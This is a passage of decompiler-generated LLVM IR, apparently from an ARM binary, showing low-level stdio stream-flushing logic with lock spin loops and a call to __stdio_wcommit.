  store i32 %v1_1cd3c, i32* %v1_1cd34, align 4
  br i1 %v2_1cd38, label %dec_label_pc_1cd48, label %dec_label_pc_1cda8

dec_label_pc_1cd48:                               ; preds = %dec_label_pc_1cd20
  %v0_1cd48 = load i32, i32* %r1.global-to-local, align 4
  %v1_1cd48 = load i32, i32* %r0.global-to-local, align 4
  %v2_1cd48 = add i32 %v1_1cd48, 8
  %v3_1cd48 = inttoptr i32 %v2_1cd48 to i32*
  store i32 %v0_1cd48, i32* %v3_1cd48, align 4
  %v0_1cd4c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1cd4c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1cd50

dec_label_pc_1cd50:                               ; preds = %dec_label_pc_1cd80.dec_label_pc_1cd50_crit_edge, %dec_label_pc_1cd48
  %v0_1cd50 = phi i32 [ %v0_1cd50.pre, %dec_label_pc_1cd80.dec_label_pc_1cd50_crit_edge ], [ %v0_1cd4c, %dec_label_pc_1cd48 ]
  %v1_1cd50 = inttoptr i32 %v0_1cd50 to i32*
  %v2_1cd50 = load i32, i32* %v1_1cd50, align 4
  store i32 %v2_1cd50, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1cd50, i32* %r2.global-to-local, align 4
  %v2_1cd5c131 = load i32, i32* %v1_1cd50, align 4
  store i32 %v2_1cd5c131, i32* %r3.global-to-local, align 4
  %v3_1cd60133 = icmp uge i32 %v2_1cd5c131, %v2_1cd50
  store i1 %v3_1cd60133, i1* %cpsr_c.global-to-local, align 1
  %v9_1cd60139 = icmp eq i32 %v2_1cd5c131, %v2_1cd50
  br i1 %v9_1cd60139, label %dec_label_pc_1cd68, label %dec_label_pc_1cd80

dec_label_pc_1cd68:                               ; preds = %dec_label_pc_1cd50, %dec_label_pc_1cd68.dec_label_pc_1cd5c_crit_edge
  %v0_1cd68140 = phi i32 [ %v1_1cd60.pre, %dec_label_pc_1cd68.dec_label_pc_1cd5c_crit_edge ], [ %v2_1cd50, %dec_label_pc_1cd50 ]
  store i32 %v0_1cd68140, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1cd78 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1cd78, label %dec_label_pc_1cd7c, label %dec_label_pc_1cd68.dec_label_pc_1cd5c_crit_edge

dec_label_pc_1cd68.dec_label_pc_1cd5c_crit_edge:  ; preds = %dec_label_pc_1cd68
  %v0_1cd5c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1cd60.pre = load i32, i32* @r4, align 4
  %v1_1cd5c = inttoptr i32 %v0_1cd5c.pre to i32*
  %v2_1cd5c = load i32, i32* %v1_1cd5c, align 4
  store i32 %v2_1cd5c, i32* %r3.global-to-local, align 4
  %v3_1cd60 = icmp uge i32 %v2_1cd5c, %v1_1cd60.pre
  store i1 %v3_1cd60, i1* %cpsr_c.global-to-local, align 1
  %v9_1cd60 = icmp eq i32 %v2_1cd5c, %v1_1cd60.pre
  br i1 %v9_1cd60, label %dec_label_pc_1cd68, label %dec_label_pc_1cd80

dec_label_pc_1cd7c:                               ; preds = %dec_label_pc_1cd68
  %v0_1cd7c = load i32, i32* @r4, align 4
  store i32 %v0_1cd7c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1cd80

dec_label_pc_1cd80:                               ; preds = %dec_label_pc_1cd50, %dec_label_pc_1cd68.dec_label_pc_1cd5c_crit_edge, %dec_label_pc_1cd7c
  %v0_1cd88 = phi i32 [ %v0_1cd7c, %dec_label_pc_1cd7c ], [ %v2_1cd5c131, %dec_label_pc_1cd50 ], [ %v2_1cd5c, %dec_label_pc_1cd68.dec_label_pc_1cd5c_crit_edge ]
  %v1_1cd80 = phi i32 [ %v0_1cd7c, %dec_label_pc_1cd7c ], [ %v2_1cd50, %dec_label_pc_1cd50 ], [ %v1_1cd60.pre, %dec_label_pc_1cd68.dec_label_pc_1cd5c_crit_edge ]
  %v3_1cd80 = icmp uge i32 %v0_1cd88, %v1_1cd80
  store i1 %v3_1cd80, i1* %cpsr_c.global-to-local, align 1
  %v9_1cd80 = icmp eq i32 %v0_1cd88, %v1_1cd80
  br i1 %v9_1cd80, label %dec_label_pc_1cd88, label %dec_label_pc_1cd80.dec_label_pc_1cd50_crit_edge

dec_label_pc_1cd80.dec_label_pc_1cd50_crit_edge:  ; preds = %dec_label_pc_1cd80
  %v0_1cd50.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1cd50

dec_label_pc_1cd88:                               ; preds = %dec_label_pc_1cd80
  %v2_1cd88 = icmp ne i32 %v1_1cd80, 0
  store i1 %v2_1cd88, i1* %cpsr_c.global-to-local, align 1
  %v7_1cd8c = icmp slt i32 %v1_1cd80, 2
  br i1 %v7_1cd8c, label %dec_label_pc_1cda8, label %dec_label_pc_1cd90

dec_label_pc_1cd90:                               ; preds = %dec_label_pc_1cd88
  %v0_1cd90 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1cd90, i32* %r0.global-to-local, align 4
  %v0_1cd94 = load i32, i32* %r1.global-to-local, align 4
  %v1_1cd94 = add i32 %v0_1cd94, 129
  store i32 %v1_1cd94, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1cda8

dec_label_pc_1cda8:                               ; preds = %dec_label_pc_1cd20, %dec_label_pc_1cd90, %dec_label_pc_1cd88
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_1cdac = load i32, i32* @r6, align 4
  %v2_1cdac = add i32 %v0_1cdac, 168
  %v3_1cdac = inttoptr i32 %v2_1cdac to i32*
  %v4_1cdac = load i32, i32* %v3_1cdac, align 4
  store i32 %v4_1cdac, i32* %r5.global-to-local, align 4
  %v1_1cdb0 = add i32 %v4_1cdac, 8
  %v2_1cdb0 = inttoptr i32 %v1_1cdb0 to i32*
  %v3_1cdb0 = load i32, i32* %v2_1cdb0, align 4
  store i32 %v3_1cdb0, i32* %r3.global-to-local, align 4
  %v1_1cdb4 = load i32, i32* %r8.global-to-local, align 4
  %v3_1cdb4 = icmp uge i32 %v3_1cdb0, %v1_1cdb4
  store i1 %v3_1cdb4, i1* %cpsr_c.global-to-local, align 1
  %v9_1cdb4 = icmp eq i32 %v3_1cdb0, %v1_1cdb4
  br i1 %v9_1cdb4, label %dec_label_pc_1cdfc, label %dec_label_pc_1cdbc

dec_label_pc_1cdbc:                               ; preds = %dec_label_pc_1cda8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_1cdac, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1cdc8123 = inttoptr i32 %v4_1cdac to i32*
  %v2_1cdc8124 = load i32, i32* %v1_1cdc8123, align 4
  store i32 %v2_1cdc8124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1cdcc126 = icmp eq i32 %v2_1cdc8124, 0
  br i1 %v9_1cdcc126, label %dec_label_pc_1cdd4, label %dec_label_pc_1cdec

dec_label_pc_1cdd4:                               ; preds = %dec_label_pc_1cdbc, %dec_label_pc_1cdd4.dec_label_pc_1cdc8_crit_edge
  %v0_1cdd4127 = phi i32 [ %v1_1cdcc.pre, %dec_label_pc_1cdd4.dec_label_pc_1cdc8_crit_edge ], [ 0, %dec_label_pc_1cdbc ]
  store i32 %v0_1cdd4127, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1cde4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1cde4, label %dec_label_pc_1cde8, label %dec_label_pc_1cdd4.dec_label_pc_1cdc8_crit_edge

dec_label_pc_1cdd4.dec_label_pc_1cdc8_crit_edge:  ; preds = %dec_label_pc_1cdd4
  %v0_1cdc8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1cdcc.pre = load i32, i32* @r4, align 4
  %v1_1cdc8 = inttoptr i32 %v0_1cdc8.pre to i32*
  %v2_1cdc8 = load i32, i32* %v1_1cdc8, align 4
  store i32 %v2_1cdc8, i32* %r3.global-to-local, align 4
  %v3_1cdcc = icmp uge i32 %v2_1cdc8, %v1_1cdcc.pre
  store i1 %v3_1cdcc, i1* %cpsr_c.global-to-local, align 1
  %v9_1cdcc = icmp eq i32 %v2_1cdc8, %v1_1cdcc.pre
  br i1 %v9_1cdcc, label %dec_label_pc_1cdd4, label %dec_label_pc_1cdec

dec_label_pc_1cde8:                               ; preds = %dec_label_pc_1cdd4
  %v0_1cde8 = load i32, i32* @r4, align 4
  store i32 %v0_1cde8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1cdec

dec_label_pc_1cdec:                               ; preds = %dec_label_pc_1cdbc, %dec_label_pc_1cdd4.dec_label_pc_1cdc8_crit_edge, %dec_label_pc_1cde8
  %v0_1cdec = phi i32 [ %v0_1cde8, %dec_label_pc_1cde8 ], [ %v2_1cdc8124, %dec_label_pc_1cdbc ], [ %v2_1cdc8, %dec_label_pc_1cdd4.dec_label_pc_1cdc8_crit_edge ]
  %v1_1cdec = phi i32 [ %v0_1cde8, %dec_label_pc_1cde8 ], [ 0, %dec_label_pc_1cdbc ], [ %v1_1cdcc.pre, %dec_label_pc_1cdd4.dec_label_pc_1cdc8_crit_edge ]
  %v3_1cdec = icmp uge i32 %v0_1cdec, %v1_1cdec
  store i1 %v3_1cdec, i1* %cpsr_c.global-to-local, align 1
  %v9_1cdec = icmp eq i32 %v0_1cdec, %v1_1cdec
  br i1 %v9_1cdec, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_1cdec
  %v1_1cdf0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_1cdf0, i32* %r0.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_1cdec, %bb67
  %v1_1cdf4 = xor i1 %v9_1cdec, true
  call void @__pseudo_cond_branch(i1 %v1_1cdf4, i32 ptrtoint (i32* @global_var_1907c.1373 to i32))
  %v0_1cdf8 = load i32, i32* %r8.global-to-local, align 4
  %v1_1cdf8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1cdf8 = add i32 %v1_1cdf8, 8
  %v3_1cdf8 = inttoptr i32 %v2_1cdf8 to i32*
  store i32 %v0_1cdf8, i32* %v3_1cdf8, align 4
  %v0_1ce00.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1cdfc

dec_label_pc_1cdfc:                               ; preds = %dec_label_pc_1cda8, %bb68
  %v0_1ce0c = phi i32 [ %v0_1cdac, %dec_label_pc_1cda8 ], [ %v0_1ce00.pre, %bb68 ]
  store i32 168, i32* %r3.global-to-local, align 4
  %v2_1ce00 = add i32 %v0_1ce0c, 168
  %v3_1ce00 = inttoptr i32 %v2_1ce00 to i32*
  %v4_1ce00 = load i32, i32* %v3_1ce00, align 4
  store i32 %v4_1ce00, i32* %r0.global-to-local, align 4
  store i32 88, i32* %r3.global-to-local, align 4
  %v1_1ce08 = add i32 %v4_1ce00, 4
  %v2_1ce08 = inttoptr i32 %v1_1ce08 to i32*
  %v3_1ce08 = load i32, i32* %v2_1ce08, align 4
  store i32 %v3_1ce08, i32* %r1.global-to-local, align 4
  %v2_1ce0c = add i32 %v0_1ce0c, 88
  %v3_1ce0c = inttoptr i32 %v2_1ce0c to i32*
  %v4_1ce0c = load i32, i32* %v3_1ce0c, align 4
  store i32 %v4_1ce0c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1ce10 = icmp eq i32 %v3_1ce08, 0
  %v1_1ce14 = inttoptr i32 %v4_1ce0c to i32*
  %v2_1ce14 = load i32, i32* %v1_1ce14, align 4
  store i32 %v2_1ce14, i32* @r5, align 4
  br i1 %v2_1ce10, label %dec_label_pc_1ce1c, label %dec_label_pc_1ce7c

dec_label_pc_1ce1c:                               ; preds = %dec_label_pc_1cdfc
  %v2_1ce1c = add i32 %v4_1ce00, 8
  %v3_1ce1c = inttoptr i32 %v2_1ce1c to i32*
  store i32 0, i32* %v3_1ce1c, align 4
  %v0_1ce20 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1ce20, i32* @r7, align 4
  br label %dec_label_pc_1ce24

dec_label_pc_1ce24:                               ; preds = %dec_label_pc_1ce54.dec_label_pc_1ce24_crit_edge, %dec_label_pc_1ce1c
  %v0_1ce24 = phi i32 [ %v0_1ce24.pre, %dec_label_pc_1ce54.dec_label_pc_1ce24_crit_edge ], [ %v0_1ce20, %dec_label_pc_1ce1c ]
  %v1_1ce24 = inttoptr i32 %v0_1ce24 to i32*
  %v2_1ce24 = load i32, i32* %v1_1ce24, align 4
  store i32 %v2_1ce24, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1ce24, i32* %r2.global-to-local, align 4
  %v2_1ce30111 = load i32, i32* %v1_1ce24, align 4
  store i32 %v2_1ce30111, i32* %r3.global-to-local, align 4
  %v3_1ce34113 = icmp uge i32 %v2_1ce30111, %v2_1ce24
  store i1 %v3_1ce34113, i1* %cpsr_c.global-to-local, align 1
  %v9_1ce34119 = icmp eq i32 %v2_1ce30111, %v2_1ce24
  br i1 %v9_1ce34119, label %dec_label_pc_1ce3c, label %dec_label_pc_1ce54

dec_label_pc_1ce3c:                               ; preds = %dec_label_pc_1ce24, %dec_label_pc_1ce3c.dec_label_pc_1ce30_crit_edge
  %v0_1ce3c120 = phi i32 [ %v1_1ce34.pre, %dec_label_pc_1ce3c.dec_label_pc_1ce30_crit_edge ], [ %v2_1ce24, %dec_label_pc_1ce24 ]
  store i32 %v0_1ce3c120, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1ce4c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1ce4c, label %dec_label_pc_1ce50, label %dec_label_pc_1ce3c.dec_label_pc_1ce30_crit_edge

dec_label_pc_1ce3c.dec_label_pc_1ce30_crit_edge:  ; preds = %dec_label_pc_1ce3c
  %v0_1ce30.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1ce34.pre = load i32, i32* @r4, align 4
  %v1_1ce30 = inttoptr i32 %v0_1ce30.pre to i32*
  %v2_1ce30 = load i32, i32* %v1_1ce30, align 4
  store i32 %v2_1ce30, i32* %r3.global-to-local, align 4
  %v3_1ce34 = icmp uge i32 %v2_1ce30, %v1_1ce34.pre
  store i1 %v3_1ce34, i1* %cpsr_c.global-to-local, align 1
  %v9_1ce34 = icmp eq i32 %v2_1ce30, %v1_1ce34.pre
  br i1 %v9_1ce34, label %dec_label_pc_1ce3c, label %dec_label_pc_1ce54

dec_label_pc_1ce50:                               ; preds = %dec_label_pc_1ce3c
  %v0_1ce50 = load i32, i32* @r4, align 4
  store i32 %v0_1ce50, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1ce54

dec_label_pc_1ce54:                               ; preds = %dec_label_pc_1ce24, %dec_label_pc_1ce3c.dec_label_pc_1ce30_crit_edge, %dec_label_pc_1ce50
  %v0_1ce5c = phi i32 [ %v0_1ce50, %dec_label_pc_1ce50 ], [ %v2_1ce30111, %dec_label_pc_1ce24 ], [ %v2_1ce30, %dec_label_pc_1ce3c.dec_label_pc_1ce30_crit_edge ]
  %v1_1ce54 = phi i32 [ %v0_1ce50, %dec_label_pc_1ce50 ], [ %v2_1ce24, %dec_label_pc_1ce24 ], [ %v1_1ce34.pre, %dec_label_pc_1ce3c.dec_label_pc_1ce30_crit_edge ]
  %v3_1ce54 = icmp uge i32 %v0_1ce5c, %v1_1ce54
  store i1 %v3_1ce54, i1* %cpsr_c.global-to-local, align 1
  %v9_1ce54 = icmp eq i32 %v0_1ce5c, %v1_1ce54
  br i1 %v9_1ce54, label %dec_label_pc_1ce5c, label %dec_label_pc_1ce54.dec_label_pc_1ce24_crit_edge

dec_label_pc_1ce54.dec_label_pc_1ce24_crit_edge:  ; preds = %dec_label_pc_1ce54
  %v0_1ce24.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1ce24

dec_label_pc_1ce5c:                               ; preds = %dec_label_pc_1ce54
  %v2_1ce5c = icmp ne i32 %v1_1ce54, 0
  store i1 %v2_1ce5c, i1* %cpsr_c.global-to-local, align 1
  %v7_1ce60 = icmp slt i32 %v1_1ce54, 2
  br i1 %v7_1ce60, label %dec_label_pc_1ce7cthread-pre-split, label %dec_label_pc_1ce64

dec_label_pc_1ce64:                               ; preds = %dec_label_pc_1ce5c
  %v0_1ce64 = load i32, i32* @r7, align 4
  store i32 %v0_1ce64, i32* %r0.global-to-local, align 4
  %v0_1ce68 = load i32, i32* %r1.global-to-local, align 4
  %v1_1ce68 = add i32 %v0_1ce68, 129
  store i32 %v1_1ce68, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1ce7cthread-pre-split

dec_label_pc_1ce7cthread-pre-split:               ; preds = %dec_label_pc_1ce5c, %dec_label_pc_1ce64
  %v0_1cfc8.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ce7c

dec_label_pc_1ce7c:                               ; preds = %dec_label_pc_1ce7cthread-pre-split, %dec_label_pc_1cdfc
  %v0_1cfc8.pr = phi i32 [ %v0_1cfc8.pr.pr, %dec_label_pc_1ce7cthread-pre-split ], [ %v2_1ce14, %dec_label_pc_1cdfc ]
  store i32 104, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1cfc818 = icmp eq i32 %v0_1cfc8.pr, 0
  br i1 %v2_1cfc818, label %dec_label_pc_1cfd0, label %dec_label_pc_1ce8c

dec_label_pc_1ce8c:                               ; preds = %dec_label_pc_1ce7c, %dec_label_pc_1cfc4
  %v0_1ceb4 = phi i32 [ %v3_1cfc4, %dec_label_pc_1cfc4 ], [ %v0_1cfc8.pr, %dec_label_pc_1ce7c ]
  %v1_1ce8c = inttoptr i32 %v0_1ceb4 to i16*
  %v2_1ce8c = load i16, i16* %v1_1ce8c, align 2
  %v3_1ce8c = zext i16 %v2_1ce8c to i32
  store i32 %v3_1ce8c, i32* %r3.global-to-local, align 4
  %v1_1ce90 = and i32 %v3_1ce8c, 64
  %v2_1ce90 = icmp eq i32 %v1_1ce90, 0
  br i1 %v2_1ce90, label %dec_label_pc_1cfc4, label %dec_label_pc_1ce98

dec_label_pc_1ce98:                               ; preds = %dec_label_pc_1ce8c
  %v0_1ce98 = load i32, i32* @r6, align 4
  %v1_1ce98 = load i32, i32* %sb.global-to-local, align 4
  %v2_1ce98 = add i32 %v1_1ce98, %v0_1ce98
  %v3_1ce98 = inttoptr i32 %v2_1ce98 to i32*
  %v4_1ce98 = load i32, i32* %v3_1ce98, align 4
  store i32 %v4_1ce98, i32* %r3.global-to-local, align 4
  %v1_1ce9c = inttoptr i32 %v4_1ce98 to i32*
  %v2_1ce9c = load i32, i32* %v1_1ce9c, align 4
  store i32 %v2_1ce9c, i32* %r3.global-to-local, align 4
  %v2_1cea0 = icmp ugt i32 %v2_1ce9c, 1
  store i1 %v2_1cea0, i1* %cpsr_c.global-to-local, align 1
  %v7_1cea0 = icmp eq i32 %v2_1ce9c, 2
  br i1 %v7_1cea0, label %dec_label_pc_1cf04, label %dec_label_pc_1cea8

dec_label_pc_1cea8:                               ; preds = %dec_label_pc_1ce98
  %v1_1cea8 = add i32 %v0_1ceb4, 64
  %v2_1cea8 = inttoptr i32 %v1_1cea8 to i32*
  %v3_1cea8 = load i32, i32* %v2_1cea8, align 4
  store i32 %v3_1cea8, i32* %r3.global-to-local, align 4
  %v1_1ceac = load i32, i32* %r8.global-to-local, align 4
  %v3_1ceac = icmp uge i32 %v3_1cea8, %v1_1ceac
  store i1 %v3_1ceac, i1* %cpsr_c.global-to-local, align 1
  %v9_1ceac = icmp eq i32 %v3_1cea8, %v1_1ceac
  br i1 %v9_1ceac, label %dec_label_pc_1cef8, label %dec_label_pc_1ceb4

dec_label_pc_1ceb4:                               ; preds = %dec_label_pc_1cea8
  %v1_1ceb4 = add i32 %v0_1ceb4, 56
  store i32 %v1_1ceb4, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_1ceb4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1cec486 = inttoptr i32 %v1_1ceb4 to i32*
  %v2_1cec487 = load i32, i32* %v1_1cec486, align 4
  store i32 %v2_1cec487, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1cec894 = icmp eq i32 %v2_1cec487, 0
  br i1 %v9_1cec894, label %dec_label_pc_1ced0, label %dec_label_pc_1cee8

dec_label_pc_1ced0:                               ; preds = %dec_label_pc_1ceb4, %dec_label_pc_1ced0.dec_label_pc_1cec4_crit_edge
  %v0_1ced095 = phi i32 [ %v1_1cec8.pre, %dec_label_pc_1ced0.dec_label_pc_1cec4_crit_edge ], [ 0, %dec_label_pc_1ceb4 ]
  store i32 %v0_1ced095, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1cee0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1cee0, label %dec_label_pc_1cee4, label %dec_label_pc_1ced0.dec_label_pc_1cec4_crit_edge

dec_label_pc_1ced0.dec_label_pc_1cec4_crit_edge:  ; preds = %dec_label_pc_1ced0
  %v0_1cec4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1cec8.pre = load i32, i32* @r4, align 4
  %v1_1cec4 = inttoptr i32 %v0_1cec4.pre to i32*
  %v2_1cec4 = load i32, i32* %v1_1cec4, align 4
  store i32 %v2_1cec4, i32* %r3.global-to-local, align 4
  %v3_1cec8 = icmp uge i32 %v2_1cec4, %v1_1cec8.pre
  store i1 %v3_1cec8, i1* %cpsr_c.global-to-local, align 1
  %v9_1cec8 = icmp eq i32 %v2_1cec4, %v1_1cec8.pre
  br i1 %v9_1cec8, label %dec_label_pc_1ced0, label %dec_label_pc_1cee8

dec_label_pc_1cee4:                               ; preds = %dec_label_pc_1ced0
  %v0_1cee4 = load i32, i32* @r4, align 4
  store i32 %v0_1cee4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1cee8

dec_label_pc_1cee8:                               ; preds = %dec_label_pc_1ceb4, %dec_label_pc_1ced0.dec_label_pc_1cec4_crit_edge, %dec_label_pc_1cee4
  %v0_1cee8 = phi i32 [ %v0_1cee4, %dec_label_pc_1cee4 ], [ %v2_1cec487, %dec_label_pc_1ceb4 ], [ %v2_1cec4, %dec_label_pc_1ced0.dec_label_pc_1cec4_crit_edge ]
  %v1_1cee8 = phi i32 [ %v0_1cee4, %dec_label_pc_1cee4 ], [ 0, %dec_label_pc_1ceb4 ], [ %v1_1cec8.pre, %dec_label_pc_1ced0.dec_label_pc_1cec4_crit_edge ]
  %v3_1cee8 = icmp uge i32 %v0_1cee8, %v1_1cee8
  store i1 %v3_1cee8, i1* %cpsr_c.global-to-local, align 1
  %v9_1cee8 = icmp eq i32 %v0_1cee8, %v1_1cee8
  br i1 %v9_1cee8, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_1cee8
  %v1_1ceec = load i32, i32* @r7, align 4
  store i32 %v1_1ceec, i32* %r0.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_1cee8, %bb69
  %v1_1cef0 = xor i1 %v9_1cee8, true
  call void @__pseudo_cond_branch(i1 %v1_1cef0, i32 ptrtoint (i32* @global_var_1907c.1373 to i32))
  %v0_1cef4 = load i32, i32* %r8.global-to-local, align 4
  %v1_1cef4 = load i32, i32* @r5, align 4
  %v2_1cef4 = add i32 %v1_1cef4, 64
  %v3_1cef4 = inttoptr i32 %v2_1cef4 to i32*
  store i32 %v0_1cef4, i32* %v3_1cef4, align 4
  %v0_1cef8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1cef8

dec_label_pc_1cef8:                               ; preds = %dec_label_pc_1cea8, %bb70
  %v0_1cef8 = phi i32 [ %v0_1ceb4, %dec_label_pc_1cea8 ], [ %v0_1cef8.pre, %bb70 ]
  %v1_1cef8 = add i32 %v0_1cef8, 60
  %v2_1cef8 = inttoptr i32 %v1_1cef8 to i32*
  %v3_1cef8 = load i32, i32* %v2_1cef8, align 4
  %v1_1cefc = add i32 %v3_1cef8, 1
  store i32 %v1_1cefc, i32* %r3.global-to-local, align 4
  store i32 %v1_1cefc, i32* %v2_1cef8, align 4
  %v0_1cf04.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1cf04

dec_label_pc_1cf04:                               ; preds = %dec_label_pc_1ce98, %dec_label_pc_1cef8
  %v0_1cf1c = phi i32 [ %v0_1ceb4, %dec_label_pc_1ce98 ], [ %v0_1cf04.pre, %dec_label_pc_1cef8 ]
  %v1_1cf04 = inttoptr i32 %v0_1cf1c to i16*
  %v2_1cf04 = load i16, i16* %v1_1cf04, align 2
  %v3_1cf04 = zext i16 %v2_1cf04 to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_1cf0c = or i32 %v3_1cf04, %stack_var_-44.1
  %v1_1cf10 = xor i32 %v2_1cf0c, 320
  store i32 %v1_1cf10, i32* %r3.global-to-local, align 4
  %v1_1cf14 = and i32 %v1_1cf10, 832
  %v2_1cf14 = icmp eq i32 %v1_1cf14, 0
  br i1 %v2_1cf14, label %dec_label_pc_1cf1c, label %bb71

dec_label_pc_1cf1c:                               ; preds = %dec_label_pc_1cf04
  store i32 %v0_1cf1c, i32* @r0, align 4
  %v0_1cf20 = call i32 @__stdio_wcommit()
  store i32 %v0_1cf20, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1cf24 = icmp eq i32 %v0_1cf20, 0
  br i1 %v2_1cf24, label %.thread6, label %.thread7

.thread6:                                         ; preds = %dec_label_pc_1cf1c
  %v1_1cf28 = load i32, i32* @r5, align 4
  %v2_1cf28 = inttoptr i32 %v1_1cf28 to i16*
  %v3_1cf28 = load i16, i16* %v2_1cf28, align 2
  %v4_1cf28 = zext i16 %v3_1cf28 to i32
  store i32 %v4_1cf28, i32* %r3.global-to-local, align 4
  %v2_1cf2c = add i32 %v1_1cf28, 8
  %v3_1cf2c = inttoptr i32 %v2_1cf2c to i32*
  %v4_1cf2c = load i32, i32* %v3_1cf2c, align 4
  store i32 %v4_1cf2c, i32* %r2.global-to-local, align 4
  %v2_1cf30 = and i32 %v4_1cf28, 65471
  store i32 %v2_1cf30, i32* %r3.global-to-local, align 4
  %v3_1cf34 = add i32 %v1_1cf28, 28
  %v4_1cf34 = inttoptr i32 %v3_1cf34 to i32*
  store i32 %v4_1cf2c, i32* %v4_1cf34, align 4
  %v1_1cf38 = load i32, i32* %r3.global-to-local, align 4
  %v2_1cf38 = trunc i32 %v1_1cf38 to i16
  %v3_1cf38 = load i32, i32* @r5, align 4
  %v4_1cf38 = inttoptr i32 %v3_1cf38 to i16*
  store i16 %v2_1cf38, i16* %v4_1cf38, align 2
  br label %bb71

.thread7:                                         ; preds = %dec_label_pc_1cf1c
  %v1_1cf3c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_1cf3c, i32* %sl.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %.thread6, %dec_label_pc_1cf04, %.thread7
  %v0_1cf40 = load i32, i32* @r6, align 4
  %v1_1cf40 = load i32, i32* %sb.global-to-local, align 4
  %v2_1cf40 = add i32 %v1_1cf40, %v0_1cf40
  %v3_1cf40 = inttoptr i32 %v2_1cf40 to i32*
  %v4_1cf40 = load i32, i32* %v3_1cf40, align 4
  store i32 %v4_1cf40, i32* %r3.global-to-local, align 4
  %v1_1cf44 = inttoptr i32 %v4_1cf40 to i32*
  %v2_1cf44 = load i32, i32* %v1_1cf44, align 4
  store i32 %v2_1cf44, i32* %r3.global-to-local, align 4
  %v2_1cf48 = icmp ugt i32 %v2_1cf44, 1
  store i1 %v2_1cf48, i1* %cpsr_c.global-to-local, align 1
  %v7_1cf48 = icmp eq i32 %v2_1cf44, 2
  br i1 %v7_1cf48, label %dec_label_pc_1cfc4, label %dec_label_pc_1cf50

dec_label_pc_1cf50:                               ; preds = %bb71
  %v0_1cf50 = load i32, i32* @r5, align 4
  %v1_1cf50 = add i32 %v0_1cf50, 60
  %v2_1cf50 = inttoptr i32 %v1_1cf50 to i32*
  %v3_1cf50 = load i32, i32* %v2_1cf50, align 4
  %v1_1cf54 = add i32 %v3_1cf50, -1
  store i32 %v1_1cf54, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1cf58 = icmp eq i32 %v1_1cf54, 0
  store i32 %v1_1cf54, i32* %v2_1cf50, align 4
  br i1 %v2_1cf58, label %dec_label_pc_1cf64, label %dec_label_pc_1cfc4

dec_label_pc_1cf64:                               ; preds = %dec_label_pc_1cf50
  %v0_1cf64 = load i32, i32* %r3.global-to-local, align 4
  %v1_1cf64 = load i32, i32* @r5, align 4
  %v2_1cf64 = add i32 %v1_1cf64, 64
  %v3_1cf64 = inttoptr i32 %v2_1cf64 to i32*
  store i32 %v0_1cf64, i32* %v3_1cf64, align 4
  %v0_1cf68 = load i32, i32* @r5, align 4
  %v1_1cf68 = add i32 %v0_1cf68, 56
  store i32 %v1_1cf68, i32* @r7, align 4
  br label %dec_label_pc_1cf6c

